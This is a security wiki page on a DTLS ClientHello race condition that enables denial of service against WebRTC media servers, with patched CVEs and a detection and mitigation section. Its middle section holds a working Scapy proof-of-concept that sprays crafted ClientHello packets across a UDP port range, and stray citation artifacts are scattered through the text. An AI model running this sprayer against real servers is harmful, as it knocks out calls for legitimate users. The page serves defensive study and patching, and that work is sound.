# WebRTC DoS

{{#include ../../banners/hacktricks-training.md}}

**This issue was found in this blog post:** [**https://www.rtcsec.com/article/novel-dos-vulnerability-affecting-webrtc-media-servers/**](https://www.rtcsec.com/article/novel-dos-vulnerability-affecting-webrtc-media-servers/)

The described vulnerability in WebRTC media servers arises from a **race condition** during the initialization of media sessions, specifically between the **ICE media consent verification** and the **DTLS traffic initiation**. Here’s a detailed breakdown:

### Vulnerability Origin

1. **UDP Port Allocation:** When a user initiates a WebRTC call, the media server allocates UDP ports for handling the media streams, with the IP and port communicated via signaling.
2. **ICE and STUN Processes:** The user's browser uses ICE for media consent verification, utilizing STUN to determine the connection path to the media server.
3. **DTLS Session:** Following successful STUN verification, a DTLS session starts to establish SRTP master keys, switching to SRTP for the media stream.

### Exploitation Mechanism

- **Race Condition Exploitation:** An attacker can exploit a race condition by sending a DTLS ClientHello message before the legitimate user, potentially using an invalid cipher suite like `TLS_NULL_WITH_NULL_NULL`. This causes a DTLS error at the server, preventing the SRTP session from being established.

### Attack Process

- **Port Scanning:** The attacker needs to guess which UDP ports are handling incoming media sessions, sending ClientHello messages with the null cipher suite to these ports to trigger the vulnerability.
- **Diagram of Attack:** The sequence involves multiple ClientHello messages sent by the attacker to the server, interleaved with legitimate signaling and DTLS messages, leading to a handshake failure due to the erroneous cipher suite.

---

## Additional Recent DoS Vulnerabilities (2023-2024)

| Project | Identifier | Patched Version | Notes |
|---------|------------|-----------------|-------|
| **Asterisk** | CVE-2023-49786 / GHSA-hxj9-xwr8-w8pq | 18.20.1 / 20.5.1 / 21.0.1 | DTLS ClientHello race condition identical to the original RTCsec finding citeturn1search0 |
| **FreeSWITCH** | CVE-2023-51443 / GHSA-39gv-hq72-j6m6 | ≥ 1.10.11 | Same race condition; fix drops DTLS packets from un-ICE-validated addresses citeturn2search1 |
| **RTPEngine** | EnableSecurity ES2023-03 (no CVE) | mr12.1.1.2, mr12.0.1.3, mr11.5.1.16, mr10.5.6.3 | Attack kills media path; patched by validating ICE pair before DTLS processing citeturn3search0 |

> All three advisories share exactly the same root cause: DTLS traffic is accepted **before** the ICE consent check has finished, so an attacker who can guess (or spray) media ports races the legitimate endpoint and wins.

### Projects Tested *Not* Vulnerable (Oct 2024 white-paper)

Janus, Mediasoup, LiveKit, Discord, Zoom, Google Meet and other popular SFUs were tested and found to already discard unauthenticated DTLS packets because they rely on libnice ≥ 0.1.17 or equivalent custom code that ties DTLS processing to successful ICE consent citeturn3search2.

---

## Proof-of-Concept Scapy Sprayer

```python
#!/usr/bin/env python3
"""Spray DTLS ClientHello packets to a target host/port range.
WARNING: *Only* use against systems you own or have permission to test.
"""
from scapy.all import IP, UDP, Raw, send
import argparse, os

# Minimal DTLS ClientHello containing NULL cipher suite (base64 decoded)
CLIENT_HELLO = (
    b"\x16\xfe\xff\x00\x00"  # ContentType handshake, legacy DTLSv1.0 record header
    b"\x01\x00\x00\x31"      # Handshake: ClientHello, length
    b"\x00\x00\x00\x00"      # DTLS sequence number
    b"\xfe\xfd"                # DTLS 1.2
    b"\x00"*28 +               # Random & session id
    b"\x00\x02\x00\x00"      # CipherSuite list length = 2, TLS_NULL_WITH_NULL_NULL
    b"\x01\x00"                # Compression methods (null)
)

def spray(target, start, end):
    for port in range(start, end + 1):
        pkt = IP(dst=target)/UDP(dport=port)/Raw(load=CLIENT_HELLO)
        send(pkt, verbose=False)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("target", help="Target IP address")
    ap.add_argument("portrange", help="e.g. 10000-12000")
    args = ap.parse_args()
    start, end = map(int, args.portrange.split("-"))
    spray(args.target, start, end)
```

The attacker simply runs:

```bash
python3 dtls_spray.py 203.0.113.10 10000-12000
```

and keeps the script looping while monitoring for DTLS alerts or SIP BYE messages on the victim side.

---

## Detection & Defensive Measures

1. **Upgrade vulnerable media servers** to the fixed versions in the table above. All patches embed logic that:  
   • Correlates the source IP/port of incoming DTLS packets with the winning ICE candidate pair.  
   • Ignores DTLS packets that arrive **before** consent is finished.
2. **Use libnice ≥ 0.1.17** (or enable the `drop-invalid` logic) – starting with that release the library “drops all packets from addresses that have not been validated by an ICE check” citeturn4search1.
3. **Network-based mitigations**:  
   • Rate-limit UDP traffic to the RTP port range (e.g. Linux `hashlimit`).  
   • Apply BPF filters that reject DTLS records smaller than 100 bytes containing the NULL cipher suite ID `0x0000`.
4. **Monitoring**:  
   • Watch for log lines such as `DTLS error: no shared cipher`, `handshake_failure`, or `alert_fatal` during call setup.  
   • Alert when the ratio of `BYE`/failed calls increases suddenly – a hallmark of the race being won by an attacker.
5. **Segmentation / eBPF**: Place SFUs on dedicated interfaces and attach an eBPF program that tracks 5-tuple flows created by ICE and drops early DTLS packets from foreign addresses.

---

### Non-Vulnerable Scenarios (unchanged)

- **DTLS Server Configurations:** Instances where the browser acts as a DTLS server or when the media server does not use ephemeral ports for media sessions are not susceptible to this vulnerability.

### Conclusion

This class of vulnerabilities highlights the delicate balance in media session initialization processes and the need for precise timing and verification mechanisms to prevent exploitation. Developers are advised to implement recommended security fixes and ensure robust verification processes to mitigate such vulnerabilities.

---

## References

* RTCsec research blog post (original finding)  
* Asterisk advisory GHSA-hxj9-xwr8-w8pq / CVE-2023-49786  
* FreeSWITCH advisory GHSA-39gv-hq72-j6m6 / CVE-2023-51443  
* RTPEngine EnableSecurity advisory ES2023-03  
* EnableSecurity white-paper on DTLS ‘ClientHello’ race conditions (Oct 2024)  
* libnice release notes ≥ 0.1.17 (drops packets from un-ICE-validated addresses)  

{{#include ../../banners/hacktricks-training.md}}
